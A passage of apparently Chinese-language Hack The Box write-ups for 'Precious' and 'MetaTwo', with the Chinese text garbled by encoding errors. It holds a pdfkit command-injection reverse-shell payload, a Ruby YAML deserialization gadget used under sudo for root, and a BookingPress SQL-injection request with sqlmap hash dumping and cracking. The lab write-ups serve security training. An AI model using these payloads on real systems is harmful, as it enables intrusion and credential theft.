CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 21/tcp)\nHOP RTT       ADDRESS\n1   264.06 ms 10.10.14.1\n2   264.51 ms 10.10.11.189\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 46.32 seconds\n```\nå¢åŠ ä¸€ä¸ª hosts è§£æ\n\n```bash\necho 10.10.11.189 precious.htb >> /etc/hosts\n```\n## Http\n![image](Hackthebox-Precious/yU0h4je2sQ4u_xq4_XsMc4kOm6jFsan6axVWrw012DI.png)\n\né¦–é¡µå°±ä¸€ä¸ªåŠŸèƒ½ï¼Œå°†ç½‘é¡µè½¬æ¢ä¸º PDF\n\n![image](Hackthebox-Precious/ESUUrIl3cFliJnYLguZJNWDl3uHLwGqeoqyN8DQE9i4.png)\n\næç¤ºæ— æ³•åŠ è½½è¿œç¨‹ URLï¼Œå°è¯•ä¸€ä¸‹æœ¬åœ°\n\n![image](Hackthebox-Precious/Htm0c_q1alaWKKxMliXq3Q3Y73S5wgmVoD7gIlWOm68.png)\n\nè¿™é‡Œä½¿ç”¨ 127.0.0.1 å’Œ localhost éƒ½ä¸è¡Œï¼Œæˆ‘ä»¬æœ¬åœ°å¼€ä¸€ä¸ª http æœåŠ¡çœ‹çœ‹æ˜¯å¦æœ‰è¯·æ±‚\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# python3 -m http.server 80                                \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# python3 -m http.server 80                                \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.189 - - [31/Dec/2022 20:41:39] \"GET / HTTP/1.1\" 200 -\n```\n![image](Hackthebox-Precious/GEzZ9J3zDYgiMN6yV8kJ4Ws-GsRxaswc_eaxkncWUdY.png)\n\nç¡®å®æ˜¯æœ‰è¯·æ±‚ï¼Œå¹¶ä¸”æˆåŠŸè½¬æ¢ä¸º pdfæ–‡ä»¶\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Downloads]\nâ””â”€# exiftool ylm4oxm111sk45cwb57jmfctpy0epjfq.pdf \nExifTool Version Number         : 12.49\nFile Name                       : ylm4oxm111sk45cwb57jmfctpy0epjfq.pdf\nDirectory                       : .\nFile Size                       : 19 kB\nFile Modification Date/Time     : 2022:12:31 20:41:41-05:00\nFile Access Date/Time           : 2022:12:31 20:42:00-05:00\nFile Inode Change Date/Time     : 2022:12:31 20:41:42-05:00\nFile Permissions                : -rw-r--r--\nFile Type                       : PDF\nFile Type Extension             : pdf\nMIME Type                       : application/pdf\nPDF Version                     : 1.4\nLinearized                      : No\nPage Count                      : 1\nCreator                         : Generated by pdfkit v0.8.6\n```\nè¿™é‡Œå¯ä»¥çœ‹åˆ°ç”Ÿæˆçš„å·¥å…·æ˜¯ pdfkit 0.8.6\n\n# æ¼æ´åˆ©ç”¨\n> [https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)\n\n> [https://www.ctfiot.com/84447.html](https://www.ctfiot.com/84447.html)\n\n> æ‰¾åˆ°äº†ä¸¤ä»½å‚è€ƒæ–‡æ¡£\n\né¦–å…ˆåˆ›å»ºä¸€ä¸ª payload\n\n```bash\nhttp://example.com/?name=%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.84/4444 <&1'`\n```\nç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\nç„¶åå»è¯·æ±‚æˆ‘ä»¬çš„ payload\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.84] from (UNKNOWN) [10.10.11.189] 40412\nbash: cannot set terminal process group (678): Inappropriate ioctl for device\nbash: no job control in this shell\nruby@precious:/var/www/pdfapp$ whoami&&id\nwhoami&&id\nruby\nuid=1001(ruby) gid=1001(ruby) groups=1001(ruby)\n```\næˆåŠŸåå¼¹å› shell\n\n# æƒé™æå‡\n## User\n```bash\nruby@precious:~/.bundle$ pwd    \npwd\n/home/ruby/.bundle\nruby@precious:~/.bundle$ cat config\ncat config\n---\nBUNDLE_HTTPS://RUBYGEMS__ORG/: \"henry:Q3c1AqGHtoI0aXAYFH\"\n```\nåœ¨ /home/ruby/.bundle ä¸­æœ‰ä¸€ä¸ª config æ–‡ä»¶ï¼Œé‡Œé¢ä¼¼ä¹æ˜¯ henry ç”¨æˆ·çš„å¯†ç \n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ssh henry@10.10.11.189  \nThe authenticity of host '10.10.11.189 (10.10.11.189)' can't be established.\nED25519 key fingerprint is SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.189' (ED25519) to the list of known hosts.\nhenry@10.10.11.189's password: \nLinux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sat Dec 31 18:20:32 2022 from 10.10.14.78\nhenry@precious:~$ whoami&&id\nhenry\nuid=1000(henry) gid=1000(henry) groups=1000(henry)\n```\næˆåŠŸæ‹¿åˆ° user æƒé™\n\n```bash\nhenry@precious:~$ cat user.txt \n415eb4be868d88438bda7f02ce8528f1\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n## Root\n```bash\nhenry@precious:~$ sudo -l\nMatching Defaults entries for henry on precious:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser henry may run the following commands on precious:\n    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb\n```\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ root æƒé™åˆ©ç”¨ ruby æ‰§è¡Œ /opt/update\\_dependencies.rb\n\n```ruby\nhenry@precious:~$ cat /opt/update_dependencies.rb\n# Compare installed dependencies with those specified in \"dependencies.yml\"\nrequire \"yaml\"\nrequire 'rubygems'\n\n# TODO: update versions automatically\ndef update_gems()\nend\n\ndef list_from_file\n    YAML.load(File.read(\"dependencies.yml\"))\nend\n\ndef list_local_gems\n    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}\nend\n\ngems_file = list_from_file\ngems_local = list_local_gems\n\ngems_file.each do |file_name, file_version|\n    gems_local.each do |local_name, local_version|\n        if(file_name == local_name)\n            if(file_version != local_version)\n                puts \"Installed version differs from the one specified in file: \" + local_name\n            else\n                puts \"Installed version is equals to the one specified in file: \" + local_name\n            end\n        end\n    end\nend\n```\nè¿™é‡Œçœ‹åˆ°ï¼Œè¿™é‡Œä½¿ç”¨äº†å®¹æ˜“å—åˆ°ååºåˆ—åŒ–æ”»å‡»çš„ YAML\n\n> [https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/)\n\nè¿™é‡Œæ‰¾åˆ°äº†ä¸€ä»½å‚è€ƒæ–‡æ¡£\n\n```bash\n---\n- !ruby/object:Gem::Installer\n    i: x\n- !ruby/object:Gem::SpecFetcher\n    i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n    io: &1 !ruby/object:Net::BufferedIO\n      io: &1 !ruby/object:Gem::Package::TarReader::Entry\n         read: 0\n         header: \"abc\"\n      debug_output: &1 !ruby/object:Net::WriteAdapter\n         socket: &1 !ruby/object:Gem::RequestSet\n             sets: !ruby/object:Net::WriteAdapter\n                 socket: !ruby/module 'Kernel'\n                 method_id: :system\n             git_set: id\n         method_id: :resolve\n```\nå°†ä¸Šé¢çš„å†…å®¹ä¿å­˜ä¸º dependencies.yml\n\nç„¶åå»è¿è¡Œ\n\n```bash\nhenry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb\nsh: 1: reading: not found\nuid=0(root) gid=0(root) groups=0(root)\nTraceback (most recent call last):\n        33: from /opt/update_dependencies.rb:17:in `<main>'\n        32: from /opt/update_dependencies.rb:10:in `list_from_file'\n        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'\n        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'\n        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'\n        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'\n        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'\n        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'\n        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'\n        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'\n        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'\n        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'\n        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'\n        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'\n        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'\n        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'\n        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'\n        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'\n        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'\n        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'\n        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'\n        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'\n        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'\n        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'\n         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'\n         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'\n         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'\n         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'\n         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'\n         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'\n         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'\n         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'\n         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'\n/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)\n```\næ‰§è¡ŒæˆåŠŸäº†ï¼Œç„¶åæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹ä»£ç \n\n```bash\n---\n- !ruby/object:Gem::Installer\n    i: x\n- !ruby/object:Gem::SpecFetcher\n    i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n    io: &1 !ruby/object:Net::BufferedIO\n      io: &1 !ruby/object:Gem::Package::TarReader::Entry\n         read: 0\n         header: \"abc\"\n      debug_output: &1 !ruby/object:Net::WriteAdapter\n         socket: &1 !ruby/object:Gem::RequestSet\n             sets: !ruby/object:Net::WriteAdapter\n                 socket: !ruby/module 'Kernel'\n                 method_id: :system\n             git_set: chmod +s /bin/bash\n         method_id: :resolve\n\n```\n```bash\nhenry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb\nsh: 1: reading: not found\nTraceback (most recent call last):\n        33: from /opt/update_dependencies.rb:17:in `<main>'\n        32: from /opt/update_dependencies.rb:10:in `list_from_file'\n        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'\n        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'\n        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'\n        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'\n        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'\n        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'\n        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'\n        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'\n        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'\n        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'\n        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'\n        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'\n        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'\n        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'\n        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'\n        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'\n        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'\n        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'\n        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'\n        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'\n        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'\n        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'\n         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'\n         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'\n         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'\n         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'\n         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'\n         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'\n         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'\n         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'\n         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'\n/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)\nhenry@precious:~$ ls -la /bin/bash\n-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash\n```\nokï¼Œæ‰§è¡ŒæˆåŠŸï¼Œç°åœ¨å»å®Œæˆææƒå§\n\n```bash\nhenry@precious:~$ /bin/bash -p\nbash-5.1# whoami&&id\nroot\nuid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)\n```\næˆåŠŸææƒåˆ° root ç”¨æˆ·\n\n```bash\nbash-5.1# cat /root/root.txt\na8ac857576f35e2c14a259a4e77bfe55\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"MetaTwo - Hackthebox","url":"/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/","content":"\n# Hackthebox - MetaTwo\n# é¶åœºä¿¡æ¯\n![image](Hackthebox-MetaTwo/uR6cU3c1jgvI8p_TtboYiEPlmfFY_p4qdXdZmmDLjKY.png)\n\n# é¶åœºç±»å‹\n![image](Hackthebox-MetaTwo/EovdXT77sIyt_X7TJipFrHeG_6QnDkkhZKKjLqhF3D0.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.186\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-12-23 01:52 EST\nWarning: 10.10.11.186 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.11.186\nHost is up (0.44s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp\n| fingerprint-strings: \n|   GenericLines: \n|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]\n|     Invalid command: try being more creative\n|_    Invalid command: try being more creative\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)\n|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)\n|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)\n80/tcp open  http    nginx 1.18.0\n|_http-title: Did not follow redirect to http://metapress.htb/\n|_http-server-header: nginx/1.18.0\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port21-TCP:V=7.93%I=7%D=12/23%Time=63A55072%P=x86_64-pc-linux-gnu%r(Gen\nSF:ericLines,8F,\"220\\x20ProFTPD\\x20Server\\x20\\(Debian\\)\\x20\\[::ffff:10\\.10\nSF:\\.11\\.186\\]\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20cr\nSF:eative\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20creativ\nSF:e\\r\\n\");\nAggressive OS guesses: Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 4.15 - 5.6 (94%), Linux 5.3 - 5.4 (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 - 3.10 (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8080/tcp)\nHOP RTT       ADDRESS\n1   408.01 ms 10.10.16.1\n2   648.09 ms 10.10.11.186\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 148.71 seconds\n```\né¦–å…ˆåŠ å…¥ä¸€ä¸ª hosts è§£æ\n\n```bash\necho 10.10.11.186 metapress.htb >> /etc/hosts\n```\n## Http\n![image](Hackthebox-MetaTwo/9nAAPY7TMRDXl3dWSXViz1hRbAdzvJqAMJem_Zmsyl0.png)\n\næ˜¯æˆ‘ç¿»è¯‘å™¨ä¸å¯¹å—ï¼Œè¿™é‡Œé¦–é¡µç¿»è¯‘å‡ºæ¥æ„æ€æ˜¯æ¬¢è¿ç™»è®°ï¼Ÿæˆ‘ä¸æ˜¯å¾ˆæ˜ç™½æ˜¯ä»€ä¹ˆæ„æ€ï¼Œè¿™é‡Œç»™å‡ºäº†ä¸¤ä¸ªä¿¡æ¯ï¼Œæœ‰ä¸€ä¸ª /events/ ç›®å½•ï¼Œä»¥åŠè¯¥é¡µé¢æ˜¯ç”¨ wordpress æ­å»ºçš„ã€‚æˆ‘ä»¬åˆ°å¤„åšä¸€ä¸‹ä¿¡æ¯æ”¶é›†\n\n## Wpscan\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# wpscan --url \"http://metapress.htb/\" --enumerate vt vp\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ Â®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.22\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://metapress.htb/ [10.10.11.186]\n[+] Started: Fri Dec 23 02:23:08 2022\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entries:\n |  - Server: nginx/1.18.0\n |  - X-Powered-By: PHP/8.0.24\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] robots.txt found: http://metapress.htb/robots.txt\n | Interesting Entries:\n |  - /wp-admin/\n |  - /wp-admin/admin-ajax.php\n | Found By: Robots Txt (Aggressive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://metapress.htb/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).\n | Found By: Rss Generator (Passive Detection)\n |  - http://metapress.htb/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>\n |  - http://metapress.htb/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>\n\n[+] WordPress theme in use: twentytwentyone\n | Location: http://metapress.htb/wp-content/themes/twentytwentyone/\n | Last Updated: 2022-11-02T00:00:00.000Z\n | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt\n | [!] The version is out of date, the latest version is 1.7\n | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1\n | Style Name: Twenty Twenty-One\n | Style URI: https://wordpress.org/themes/twentytwentyone/\n | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n | Confirmed By: Css Style In 404 Page (Passive Detection)\n |\n | Version: 1.1 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'\n\n[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)\n Checking Known Locations - Time: 00:00:31 <===================================================================================================================================> (482 / 482) 100.00% Time: 00:00:31\n[+] Checking Theme Versions (via Passive and Aggressive Methods)\n\n[i] No themes Found.\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Fri Dec 23 02:23:51 2022\n[+] Requests Done: 509\n[+] Cached Requests: 14\n[+] Data Sent: 154.463 KB\n[+] Data Received: 518.845 KB\n[+] Memory used: 186.137 MB\n[+] Elapsed time: 00:00:43\n```\nè¿™é‡Œç¡®å®šäº† wordpress çš„ç‰ˆæœ¬ä¸º 5.6.2ï¼Œç„¶åå‘ç°äº†ä¸¤ä¸ªé¡µé¢\n\n```bash\n/wp-admin/\n/wp-admin/admin-ajax.php\n```\n# æ¼æ´åˆ©ç”¨\næˆ‘ä»¬åœ¨ç¬¬äºŒä¸ªé¡µé¢ä¸­å‘ç°äº†ä¸€ä¸ªæ’ä»¶ bookingpress 1.0.10\n\n![image](Hackthebox-MetaTwo/nO4dQvMqb5e2Pc5-oz9Hb_5wJWDk3TApcQIfH8HOwYI.png)\n\n> [https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)\n\nå‘ç°äº†ä¸€ä¸ªæ¼æ´ï¼Œä¼¼ä¹æ˜¯å…è®¸æˆ‘ä»¬è¿›è¡Œæ³¨å…¥çš„æ¼æ´æ¼æ´\n\nå¯¹äºè¿™é¡¹æ¼æ´çš„åˆ©ç”¨ï¼Œæˆ‘ä»¬éœ€è¦ä¸€äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ /wp-admin/admin-ajax.php ä¸­æ‰¾åˆ°\n\n![image](Hackthebox-MetaTwo/hotp2ayPMJjZ1Ew2f8YaAlRpLvuPG5RNNHuB42Qejok.png)\n\n\n\n```bash\n_wpnonce = b0a6dfdddb\n```\nç„¶åæˆ‘ä»¬å°±å¯ä»¥æ„é€  poc äº†\n\n```bash\ncurl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=b0a6dfdddb&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x http://127.0.0.1:8080\n```\nç„¶åä½¿ç”¨ curl çš„ -x å‚æ•°å°†åŒ…å‘é€åˆ° burp ä¸­\n\n![image](Hackthebox-MetaTwo/9PFSpyMIeZT43lK1tBcABBBQFTI3T7yGGTEMXh4ZDRo.png)\n\n![image](Hackthebox-MetaTwo/yT76Ix0j2yfaIrCA7VSSXE5ytJP8Pf7qNlAfwE-ZjuI.png)\n\nç„¶åä½¿ç”¨ copytofile å°†å…¶ä¿å­˜ä¸º admin.req\n\n```bash\nPOST /wp-admin/admin-ajax.php HTTP/1.1\nHost: metapress.htb\nUser-Agent: curl/7.85.0\nAccept: */*\nContent-Length: 185\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\naction=bookingpress_front_get_category_services&_wpnonce=b0a6dfdddb&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -\n```\nè¿™æ˜¯æˆ‘ä»¬ä¿å­˜ä¸‹æ¥çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦ç¨å¾®ä¿®æ”¹ä¸€ä¸‹ï¼Œå°† total\\_service åé¢çš„å‚æ•°æ”¹ä¸º 1\n\n```bash\nPOST /wp-admin/admin-ajax.php HTTP/1.1\nHost: metapress.htb\nUser-Agent: curl/7.85.0\nAccept: */*\nContent-Length: 185\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\naction=bookingpress_front_get_category_services&_wpnonce=b0a6dfdddb&category_id=33&total_service=1\n```\nè¿™æ˜¯æˆ‘ä»¬ä¿®æ”¹å¥½çš„æ–‡ä»¶ï¼Œç„¶åä¸¢è¿› sqlmap è·‘å°±è¡Œäº†\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# sqlmap -r admin.req -p total_service --batch -D blog -T wp_users --dump\n\n+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+\n| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |\n+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+\n| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |\n| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |\n+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+\n```\nç„¶åæŠŠ user\\_pass çš„ hash ä¸¢è¿› john é‡Œè·‘ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash \nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])\nCost 1 (iteration count) is 8192 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\npartylikearockstar (?)     \n1g 0:00:10:20 DONE (2022-12-23 03:03) 0.001610g/s 23102p/s 23280c/s 23280C/s  joefeher..*7Â¡Vamos!\nUse the \"--show --format=phpass\" options to display all of the cracked passwords reliably\nSession completed.\n```\nè¿™é‡Œè·‘å‡ºæ¥äº†ä¸€ä¸ªå¯†ç  